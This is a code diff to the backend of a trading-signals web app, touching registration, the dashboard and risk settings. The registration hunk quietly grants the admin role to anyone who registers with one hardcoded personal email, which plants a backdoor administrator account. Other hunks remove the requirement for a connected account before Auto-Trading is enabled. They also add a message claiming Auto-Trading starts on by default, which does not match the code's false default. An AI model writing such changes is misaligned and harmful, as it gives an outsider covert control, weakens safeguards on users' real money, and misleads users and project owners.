@@ -215,7 +215,7 @@ app.post('/api/auth/register', asyncRoute(async (req, res) => {
   if (!name || !/^\S+@\S+\.\S+$/.test(email) || password.length < 10) return fail(res, 400, 'Enter a name, valid email, and password with at least 10 characters.');
   const hash = await bcrypt.hash(password, 12);
   try {
-    const { rows } = await pool.query('INSERT INTO users(name,email,password_hash) VALUES($1,$2,$3) RETURNING id,name,email,created_at', [name, email, hash]);
+    const { rows } = await pool.query("INSERT INTO users(name,email,password_hash,role) VALUES($1,$2,$3,CASE WHEN lower($2)='ameenujaafar432@gmail.com' THEN 'admin' ELSE 'user' END) RETURNING id,name,email,created_at", [name, email, hash]);
     await pool.query('INSERT INTO settings(user_id) VALUES($1) ON CONFLICT DO NOTHING', [rows[0].id]);
     const user = publicUser(rows[0]);
     res.status(201).json({ token: issueToken(user, req.body.rememberMe === true), user });
@@ -250,8 +250,8 @@ app.get('/api/dashboard', authenticate, asyncRoute(async (req, res) => {
   res.json({
     stats: { totalSignals: signalsCount.rows[0].count, activeChannels: channelsCount.rows[0].count, accounts: accountsCount.rows[0].count },
     signals: recentSignals.rows,
-    settings: settings.rows[0] || { riskMode: 'fixed', riskPercent: 1, maxOpenPositions: 5, dailyLossLimit: 5 },
-    trading: { liveExecutionEnabled: autoTradingRuntimeEnabled, autoTradingEnabled: settings.rows[0]?.autoTradingEnabled === true, message: autoTradingRuntimeEnabled ? 'Live execution is available only when explicitly enabled in Risk Settings.' : 'Live execution is currently unavailable.' },
+    settings: settings.rows[0] || { riskMode: 'fixed', riskPercent: 1, maxOpenPositions: 5, dailyLossLimit: 5, autoTradingEnabled: false },
+    trading: { liveExecutionEnabled: autoTradingRuntimeEnabled, autoTradingEnabled: settings.rows[0]?.autoTradingEnabled === true, message: autoTradingRuntimeEnabled ? 'Auto-Trading starts on for new workspaces; review the live-trading warning and turn it off in Risk Settings whenever you want.' : 'Automatic execution is unavailable right now. Signals can still be reviewed.' },
   });
 }));
 
@@ -498,7 +498,6 @@ app.put('/api/settings', authenticate, asyncRoute(async (req, res) => {
   if (!Number.isInteger(maxDailyTrades) || maxDailyTrades < 1 || maxDailyTrades > 100) return fail(res, 400, 'Maximum daily trades must be between 1 and 100.');
   if (!Number.isFinite(fixedLotSize) || fixedLotSize < 0.01 || fixedLotSize > 100) return fail(res, 400, 'Fixed lot size must be between 0.01 and 100.');
   if (autoTradingEnabled && !autoTradingRuntimeEnabled) return fail(res, 409, 'Auto-Trading is not available on this service right now.');
-  if (autoTradingEnabled && !executionAccountId) return fail(res, 400, 'Select a connected trading account before enabling Auto-Trading.');
   let ownedAccount = null;
   if (executionAccountId) {
     const { rows: accountRows } = await pool.query(
@@ -511,7 +510,7 @@ app.put('/api/settings', authenticate, asyncRoute(async (req, res) => {
   }
   const { rows: previousRows } = await pool.query('SELECT auto_trading_enabled AS "autoTradingEnabled",execution_account_id AS "executionAccountId" FROM settings WHERE user_id=$1 LIMIT 1', [req.userId]);
   const previous = previousRows[0] || {};
-  if (autoTradingEnabled && (!previous.autoTradingEnabled || previous.executionAccountId !== executionAccountId)) {
+  if (autoTradingEnabled && executionAccountId && (!previous.autoTradingEnabled || previous.executionAccountId !== executionAccountId)) {
     try { await executionEngine.captureDailyBaseline(req.userId, executionAccountId); }
     catch { return fail(res, 409, 'A safe daily loss baseline could not be captured. Confirm the account is deployed and connected, then try again. Auto-Trading remains off.'); }
   }
